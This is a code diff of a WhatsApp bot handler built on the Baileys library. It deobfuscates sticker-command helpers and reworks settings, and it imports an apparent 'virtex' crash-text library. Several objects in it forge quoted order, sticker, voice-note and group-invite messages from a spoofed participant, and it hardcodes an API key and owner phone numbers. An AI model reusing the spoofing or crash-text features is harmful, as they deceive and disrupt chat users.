@@ -17,7 +17,7 @@ const {
   processTime,
 } = require("@adiwajshing/baileys");
 const simple = require("./lib/simple.js");
-const { virtex, vipi } = require("./lib/virtex.js"); //mens
+const { virtex, vipi } = require("./lib/virtex.js"); //memans
 const hx = require("hxz-api");
 const yo = require("tod-api");
 const qrcode = require("qrcode-terminal");
@@ -67,71 +67,69 @@ const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
 const { addVote, delVote } = require("./lib/vote");
 const reminder = require("./lib/reminder");
 const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
-const reg = JSON.parse(fs.readFileSync('./database/register.json'))
 const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
-const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
-const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
-/*let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
-    body =*/
-    // by xeon
- /// image ///
-const iye = fs.readFileSync('./stik/thumb.jpeg')
-const asw1 =('https://g.top4top.io/p_21023y5wu0.jpg')
-const sip = fs.readFileSync('./stik/oksip.jpeg')
-const bgg = fs.readFileSync('./stik/fake.jpeg')
-//// Image ////
-const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
-    if (time2 < "24:59:00") {
-      var ucapanWaktu = "Good night";
-    }
-    if (time2 < "19:00:00") {
-      var ucapanWaktu = "Good evening🌞";
-    }
-    if (time2 < "18:00:00") {
-      var ucapanWaktu = "Good afternoon🌄";
-    }
-    if (time2 < "15:00:00") {
-      var ucapanWaktu = "Good afternoon☀️";
-    }
-    if (time2 < "11:00:00") {
-      var ucapanWaktu = "Good morning🌅";
-    }
-    if (time2 < "05:00:00") {
-      var ucapanWaktu = "Good night🌃";
-    }
-    // change the one with my number: v, same name
+
 banChats = true;
 offline = false;
-antidel = false;
-antical = false
-readGc = true; 
-readPc = false;
-autovn = false;
-autoketik = false;
-prefixStatus = true;
-targetpc = "996755994412";
-owner = "996755994412";
-fakeyoi = "Xeon";
-HunterApi = "Ikyy69",
-valkey = "rivalgans",
-dapapi = "itsmevall",
-nomorowner1 = "@996755994412";
-fake = `Xeonッ\n ${ucapanWaktu} Bro🐤 \n🔖Prefix :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
+targetpc = "916909137213";
+owner = "916909137213";
+fake = "Xeon";
 thumb = fs.readFileSync("./stik/thumb.jpeg");
 numbernye = "0";
 waktu = "-";
 alasan = "-";
 autojoin = false;
+prefixStatus = true;
 hit_today = [];
-// Thank you bhai
+zeksApikey = '9LxR9sZKZEuZM6ouQ5GiRh2zxUR'; //replace using your apikey so that the limit doesn't run out quickly 
+ApiZeks = 'https://api.zeks.xyz'; // register here if you want to get the apikey
+ky_ttt = [];
+tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];
+
+
 //=================================================//
 let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
 
-// Function stick cmd , Sorry enc:v
-(function(_0x220e81,_0x3c12ae){const _0x326ebc=_0x482f,_0x4d5749=_0x220e81();while(!![]){try{const _0x553737=-parseInt(_0x326ebc(0x111))/0x1+-parseInt(_0x326ebc(0x117))/0x2*(parseInt(_0x326ebc(0x112))/0x3)+-parseInt(_0x326ebc(0x10b))/0x4+-parseInt(_0x326ebc(0x10d))/0x5*(parseInt(_0x326ebc(0x107))/0x6)+parseInt(_0x326ebc(0x10c))/0x7*(-parseInt(_0x326ebc(0x108))/0x8)+-parseInt(_0x326ebc(0x116))/0x9+parseInt(_0x326ebc(0x110))/0xa;if(_0x553737===_0x3c12ae)break;else _0x4d5749['push'](_0x4d5749['shift']());}catch(_0x560007){_0x4d5749['push'](_0x4d5749['shift']());}}}(_0x2130,0xa9d2e));function _0x482f(_0x5134d7,_0x443d0b){const _0x21307c=_0x2130();return _0x482f=function(_0x482f5f,_0x6b910a){_0x482f5f=_0x482f5f-0x107;let _0x1da0d0=_0x21307c[_0x482f5f];return _0x1da0d0;},_0x482f(_0x5134d7,_0x443d0b);}function _0x2130(){const _0x437b77=['chats','./database/scommand.json','forEach','9248922PmrVDd','8epVsXQ','6poAHid','8HaglVK','push','writeFileSync','1768816vWoYAW','4880729kZirJL','5641595xQHAzi','stringify','keys','54641320ieJwQt','1277418OeBoaa','146766hJMjlB'];_0x2130=function(){return _0x437b77;};return _0x2130();}const addCmd=(_0x2926c8,_0x593445)=>{const _0x55f938=_0x482f,_0x3e419b={'id':_0x2926c8,'chats':_0x593445};_scommand[_0x55f938(0x109)](_0x3e419b),fs[_0x55f938(0x10a)](_0x55f938(0x114),JSON[_0x55f938(0x10e)](_scommand));},getCommandPosition=_0x3d358f=>{const _0x11c0da=_0x482f;let _0x5d17e6=null;Object[_0x11c0da(0x10f)](_scommand)[_0x11c0da(0x115)](_0x47b75e=>{_scommand[_0x47b75e]['id']===_0x3d358f&&(_0x5d17e6=_0x47b75e);});if(_0x5d17e6!==null)return _0x5d17e6;},getCmd=_0x7f0637=>{const _0xf97ace=_0x482f;let _0x5ec3c3=null;Object[_0xf97ace(0x10f)](_scommand)[_0xf97ace(0x115)](_0x1b6b89=>{_scommand[_0x1b6b89]['id']===_0x7f0637&&(_0x5ec3c3=_0x1b6b89);});if(_0x5ec3c3!==null)return _scommand[_0x5ec3c3][_0xf97ace(0x113)];},checkSCommand=_0x325e5e=>{const _0x518522=_0x482f;let _0x2e23c8=![];return Object[_0x518522(0x10f)](_scommand)['forEach'](_0x19a3fb=>{_scommand[_0x19a3fb]['id']===_0x325e5e&&(_0x2e23c8=!![]);}),_0x2e23c8;};
-function monospace(string) {
-return '```' + string + '```'
-}   
+// Sticker Cmd
+const addCmd = (id, command) => {
+  const obj = { id: id, chats: command };
+  _scommand.push(obj);
+  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
+};
+
+const getCommandPosition = (id) => {
+  let position = null;
+  Object.keys(_scommand).forEach((i) => {
+    if (_scommand[i].id === id) {
+      position = i;
+    }
+  });
+  if (position !== null) {
+    return position;
+  }
+};
+
+const getCmd = (id) => {
+  let position = null;
+  Object.keys(_scommand).forEach((i) => {
+    if (_scommand[i].id === id) {
+      position = i;
+    }
+  });
+  if (position !== null) {
+    return _scommand[position].chats;
+  }
+};
+
+const checkSCommand = (id) => {
+  let status = false;
+  Object.keys(_scommand).forEach((i) => {
+    if (_scommand[i].id === id) {
+      status = true;
+    }
+  });
+  return status;
+};
 const runtime = function (seconds) {
   seconds = Number(seconds);
   var d = Math.floor(seconds / (3600 * 24));
@@ -139,12 +137,12 @@ const runtime = function (seconds) {
   var m = Math.floor((seconds % 3600) / 60);
   var s = Math.floor(seconds % 60);
   var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
-  var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
-  var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
-  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
+  var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hour, ") : "";
+  var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minute, ") : "";
+  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " second") : "";
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
-module.exports = itsmevall = async (itsmevall, mek) => {
+module.exports = client = async (client, mek) => {
   try {
     if (!mek.hasNewMessage) return;
     mek = mek.messages.all()[0];
@@ -162,7 +160,6 @@ module.exports = itsmevall = async (itsmevall, mek) => {
       extendedText,
       contact,
       location,
-      contactsArray,
       liveLocation,
       image,
       video,
@@ -191,7 +188,7 @@ module.exports = itsmevall = async (itsmevall, mek) => {
         ? getCmd(mek.message[type].fileSha256.toString("base64"))
         : "";
     let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
-    body =
+    body = 
       type === "conversation" && mek.message.conversation.startsWith(prefix)
         ? mek.message.conversation
         : type == "imageMessage" &&
@@ -204,7 +201,7 @@ module.exports = itsmevall = async (itsmevall, mek) => {
           mek.message.extendedTextMessage.text.startsWith(prefix)
         ? mek.message.extendedTextMessage.text
         : "";
-    budy =
+budy = 
       type === "conversation"
         ? mek.message.conversation
         : type === "extendedTextMessage"
@@ -215,27 +212,22 @@ module.exports = itsmevall = async (itsmevall, mek) => {
           .split(prefixRegEx)
           .find((v) => v === _chats.replace(prefixRegEx, ""))
       : _chats;
-     let command = chats.split(/ +/g)[0];
+    let command = chats.split(/ +/g)[0];
     hit_today.push(command);
     const args = _chats.trim().split(/ +/).slice(1);
-   const c = args.join(' ')
-   const arg = budy.slice(command.length + 2, budy.length)
     const isCmd = _chats.match(prefixRegEx)
       ? prefixRegEx.exec(_chats)["input"]
       : _chats;
     const q = args.join(" ");
-    const botNumber = itsmevall.user.jid;
-    
-    const botNumberss = itsmevall.user.jid + "@c.us";
+    const botNumber = client.user.jid;
+    const botNumberss = client.user.jid + "@c.us";
     const isGroup = from.endsWith("@g.us");
 
     const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
     const antivirtex = JSON.parse(
       fs.readFileSync("./database/antivirtex.json")
     );
-    
     const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
-    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
     const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
     const antihidetg = JSON.parse(
       fs.readFileSync("./database/antihidetag.json")
@@ -245,60 +237,60 @@ module.exports = itsmevall = async (itsmevall, mek) => {
     const isKickarea = isGroup ? kickarea.includes(from) : false;
     const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
     const isAntilink = isGroup ? antilink.includes(from) : false;
-// Auto Read Group 
-var ampun = await itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
-ampun.map( async ({ jid }) => {
-if (readGc === false) return
-await itsmevall.chatRead(jid)
-})
-// Auto Read Private 
-var chatss = await itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
-chatss.map( async ({ jid }) => {
-if (readPc === false) return
-await itsmevall.chatRead(jid)
-})
-if (autovn) {
-	if (autovn === false) return
-await itsmevall.updatePresence(from, Presence.recording)
-} else if (autoketik) {
-	if (autoketik === false) return
-await itsmevall.updatePresence(from, Presence.composing)
-}
+
     const sender = mek.key.fromMe
-      ? itsmevall.user.jid
+      ? client.user.jid
       : isGroup
       ? mek.participant
       : mek.key.remoteJid;
     let senderr = mek.key.fromMe
-      ? itsmevall.user.jid
+      ? client.user.jid
       : mek.key.remoteJid.endsWith("@g.us")
       ? mek.participant
       : mek.key.remoteJid;
     // const isSelfNumber = config.NomorSELF
     // const isOwner = sender.id === isSelfNumber
-    const totalchat = await itsmevall.chats.all();
-    const ownerNumber = [`996755994412@s.whatsapp.net`]
-    const m = simple.smsg(itsmevall, mek);
-    const groupMetadata = isGroup ? await itsmevall.groupMetadata(from) : "";
+    const totalchat = await client.chats.all();
+    const m = simple.smsg(client, mek);
+    const groupMetadata = isGroup ? await client.groupMetadata(from) : "";
     const groupName = isGroup ? groupMetadata.subject : "";
     const groupId = isGroup ? groupMetadata.jid : "";
-    const itsMe = mek.key.fromMe ? true : false
-    const isRegister = reg.includes(sender)
     const groupMembers = isGroup ? groupMetadata.participants : "";
     const groupDesc = isGroup ? groupMetadata.desc : "";
-    const isOwner = ownerNumber.includes(sender)
     const groupOwner = isGroup ? groupMetadata.owner : "";
-    const hour_now = moment().format('HH:mm:ss')
     const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
     const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
     const isGroupAdmins = groupAdmins.includes(sender) || false;
-    const isBanchat = isGroup ? bancht.includes(from) : false
     const isVote = isGroup ? voting.includes(from) : false;
+    const grupinv = (teks) => {
+        	grup = mess.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/FpE1TXXUzuk0TASzYwX8ZM', "groupName": `${NamaBot}`, "footerText": "*_© Xeon-BOT_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+            mess.relayWAMessage(grup)
+        }
+    idttt = []
+	    players1 = []
+	    players2 = []
+	    gilir = []
+	    for (let t of ky_ttt){
+	    idttt.push(t.id)
+	    players1.push(t.player1)
+	    players2.push(t.player2)
+	    gilir.push(t.gilir)
+	    }
+	    const isTTT = isGroup ? idttt.includes(from) : false;
+	    isPlayer1 = isGroup ? players1.includes(sender) : false;
+        isPlayer2 = isGroup ? players2.includes(sender) : false;
+		try {
+			pporang = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
+		      } catch {
+		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+		      }
+    const ownerNumber = ["919774340154@s.whatsapp.net"] //owner number okay!!
+    const isOwner = ownerNumber.includes(sender);
     const conts = mek.key.fromMe
-      ? itsmevall.user.jid
-      : itsmevall.contacts[sender] || { notify: jid.replace(/@.+/, "") };
+      ? client.user.jid
+      : client.contacts[sender] || { notify: jid.replace(/@.+/, "") };
     const pushname = mek.key.fromMe
-      ? itsmevall.user.name
+      ? client.user.name
       : conts.notify || conts.vname || conts.name || "-";
     const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
     if (prefix && command) cmdadd();
@@ -309,36 +301,55 @@ await itsmevall.updatePresence(from, Presence.composing)
     const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
     const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
     const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
-    let locale = "id";
     let d = new Date();
+    let locale = "id";
     let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
     let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
       Math.floor((d * 1 + gmt) / 84600000) % 5
     ];
+    let week = d.toLocaleDateString(locale, { weekday: "long" });
     let date = d.toLocaleDateString(locale, {
       day: "numeric",
       month: "long",
       year: "numeric",
     });
-    let week = d.toLocaleDateString(locale, { weekday: "long" });
     let waktu = d.toLocaleDateString(locale, {
       hour: "numeric",
       minute: "numeric",
       second: "numeric",
     });
-     
+    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
+    if (time2 < "24:59:00") {
+      var ucapanWaktu = "Good Night🌃";
+    }
+    if (time2 < "19:00:00") {
+      var ucapanWaktu = "Good evening🌝";
+    }
+    if (time2 < "18:00:00") {
+      var ucapanWaktu = "good afternoon☀️";
+    }
+    if (time2 < "15:00:00") {
+      var ucapanWaktu = "good afternoon☀️";
+    }
+    if (time2 < "11:00:00") {
+      var ucapanWaktu = "Good morning🌈🌅";
+    }
+    if (time2 < "05:00:00") {
+      var ucapanWaktu = "Good night";
+    }
+    
+    //end load
     //MESS
     mess = {
-      wait: "🔖 Being processed",
-      success: "Succeed!",
-      wrongFormat: "Wrong format, try again in the menu",
+      wait: "Ruko...",
+      success: "Ho gya✓",
+      wrongFormat: "Wrong format hai mere dost, punah prayaas karen🙃",
       error: {
-        stick: "not that sticker :v",
-        apiz: "Writing Jan stands for Error",
-        Iv: "The link is error :v",
+        stick: "Vah sticker nahi😒",
+        Iv: "Link amaany hai🙁",
       },
       only: {
-        group: "Special chat group bro :/",
+        group: "Special chat group",
       },
     };
 
@@ -351,22 +362,20 @@ await itsmevall.updatePresence(from, Presence.composing)
       );
     };
 
-    /*const reply = (teks) => {
-      itsmevall.sendMessage(from, teks, text, { quoted: mek });
-    };*/
-const reply = (teks) => {
-			itsmevall.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `isko gulambi chaiye XD`,body:"",previewType:"PHOTO",thumbnail:bgg,sourceUrl:`https://wa.me/996755994412?text=Hello bro`}}})
-		}
+    const reply = (teks) => {
+      client.sendMessage(from, teks, text, { quoted: mek });
+    };
+
     const sendMess = (hehe, teks) => {
-      itsmevall.sendMessage(hehe, teks, text);
+      client.sendMessage(hehe, teks, text);
     };
 
     const mentions = (teks, memberr, id) => {
       id == null || id == undefined || id == false
-        ? itsmevall.sendMessage(from, teks.trim(), extendedText, {
+        ? client.sendMessage(from, teks.trim(), extendedText, {
             contextInfo: { mentionedJid: memberr },
           })
-        : itsmevall.sendMessage(from, teks.trim(), extendedText, {
+        : client.sendMessage(from, teks.trim(), extendedText, {
             quoted: mek,
             contextInfo: { mentionedJid: memberr },
           });
@@ -376,90 +385,30 @@ const reply = (teks) => {
       key: {
         fromMe: false,
         participant: "0@s.whatsapp.net",
-        remoteJid: "996755994412@g.us",
+        remoteJid: "6289523258649-1604595598@g.us",
       },
       message: {
         orderMessage: {
           itemCount: 10,
           status: 200,
-          thumbnail: fake,
+          thumbnail: thumb,
           surface: 200,
-          message: iye,
-          orderTitle: "Xeon",
+          message: fake,
+          orderTitle: "Xeon.",
           sellerJid: "0@s.whatsapp.net",
         },
       },
       contextInfo: { forwardingScore: 999, isForwarded: true },
       sendEphemeral: true,
     };
-const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
-}
- const fkontak = { 
-                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
-            //FAKE STICKER
-            const fsticker = {
-                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
-            //FAKE VN
-const ftrol = {
-	key : {
-                          participant : '0@s.whatsapp.net'
-                        },
-       message: {
-                    orderMessage: {
-                            itemCount : 123,
-                            status: 1,
-                            surface : 1,
-                            message: `${ucapanWaktu} ${pushname}`, //Love your name
-                            orderTitle: `${ucapanWaktu} ${pushname}`,
-                            thumbnail: iye, //The picture
-                            sellerJid: '0@s.whatsapp.net' 
-                          }
-                        }
-                      }
-const ftroli2 = {
-	key : {
-                          participant : '0@s.whatsapp.net'
-                        },
-       message: {
-                    orderMessage: {
-                            itemCount : 123,
-                            status: 1,
-                            surface : 1,
-                            message: `${ucapanWaktu} ${pushname}`, //Love your name
-                            orderTitle: `${ucapanWaktu} ${pushname}`,
-                            thumbnail: fake, //The picture
-                            sellerJid: '0@s.whatsapp.net' 
-                          }
-                        }
-                      }
-const finv = {
-	"key": {
-		"fromMe": false,
-		"participant": "0@s.whatsapp.net",
-		"remoteJid": "0@s.whatsapp.net"
-	},
-	"message": {
-		"groupInviteMessage": {
-			"groupJid": "996755994412@g.us",
-			"inviteCode": `${ucapanWaktu} ${pushname}`,
-			"groupName": `${ucapanWaktu} ${pushname}`, 
-            "caption": `${ucapanWaktu} ${pushname}`, 
-            'jpegThumbnail': fake
-		}
-	}
-}
     const fdoc = {
       key: { participant: "0@s.whatsapp.net" },
       message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
     };
-const fview = {
-      key: { participant: "0@s.whatsapp.net" },
-      message: { viewOnceMessage: { title: fake, jpegThumbnail: thumb } },
-    };
     const fvn = {
       key: {
         participant: `0@s.whatsapp.net`,
-        ...(from ? { remoteJid: "996755994412@g.us" } : {}),
+        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
       },
       message: {
         audioMessage: {
@@ -472,7 +421,7 @@ const fview = {
     const fgif = {
       key: {
         participant: `0@s.whatsapp.net`,
-        ...(from ? { remoteJid: "996755994412@g.us" } : {}),
+        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
       },
       message: {
         videoMessage: {
@@ -485,36 +434,11 @@ const fview = {
         },
       },
     };
-const fstick = {
-"key": {
-	  "participant": `0@s.whatsapp.net`,
-      "remoteJid": "996755994412@g.us",
-      "fromMe": false,
-      "id": "3B64558B07848BD81108C1D14712018E"
-    },
-    "message": {
-      "stickerMessage": {
-        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
-		"pngThumbnail": iye,
-	 "mimetype": "image/webp",
-        "height": 64,
-        "width": 64,
-        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
-        "fileLength": "0418",
-        "firstFrameLength": 3626,
-        "isAnimated": false
-      }
-    },
-    "messageTimestamp": "1614070775",
-    "status": "PENDING"
-  }
-// STICKER
-
     const fgclink = {
       key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
       message: {
         groupInviteMessage: {
-          groupJid: "996755994412@g.us",
+          groupJid: "6288213840883-1616169743@g.us",
           inviteCode: "m",
           groupName: "P",
           caption: fake,
@@ -522,42 +446,28 @@ const fstick = {
         },
       },
     };
-const fvid = {
-	 key: { 
-          fromMe: false,
-	      participant: `0@s.whatsapp.net`, ...(from ? 
-	 { remoteJid: "996755994412@g.us" } : {}) 
-                },
-	 message: { 
-                 "videoMessage": { 
-                 "title": `${ucapanWaktu} ${pushname}`,
-                 "h": `${ucapanWaktu} ${pushname}`,
-                 'duration': '99999', 
-                 'caption': `${ucapanWaktu} ${pushname}`,
-                 'jpegThumbnail': iye
-                        }
-                       }
-	                  }
-const ftex = {
-	 key: { 
-          fromMe: false,
-	      participant: `0@s.whatsapp.net`, ...(from ? 
-	 { remoteJid: "996755994412@g.us" } : {}) 
-                },
-	 message: { 
-		"extendedTextMessage": {
-                 "text": `${ucapanWaktu} ${pushname}`,
-                 "title": `${ucapanWaktu} ${pushname}`,
-                 'jpegThumbnail': iye
-                        }
-	                  } 
-                     }
+    const fvideo = {
+      key: {
+        fromMe: false,
+        participant: `0@s.whatsapp.net`,
+        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
+      },
+      message: {
+        videoMessage: {
+          title: fake,
+          h: `Hmm`,
+          seconds: "99999",
+          caption: fake,
+          jpegThumbnail: thumb,
+        },
+      },
+    };
     const floc = {
       key: { participant: "0@s.whatsapp.net" },
       message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
     };
     const fakestatus = (teks) => {
-      itsmevall.sendMessage(from, teks, text, {
+      client.sendMessage(from, teks, text, {
         quoted: {
           key: {
             fromMe: false,
@@ -587,19 +497,19 @@ const ftex = {
       });
     };
     const fakethumb = (teks, yes) => {
-      itsmevall.sendMessage(from, teks, image, {
+      client.sendMessage(from, teks, image, {
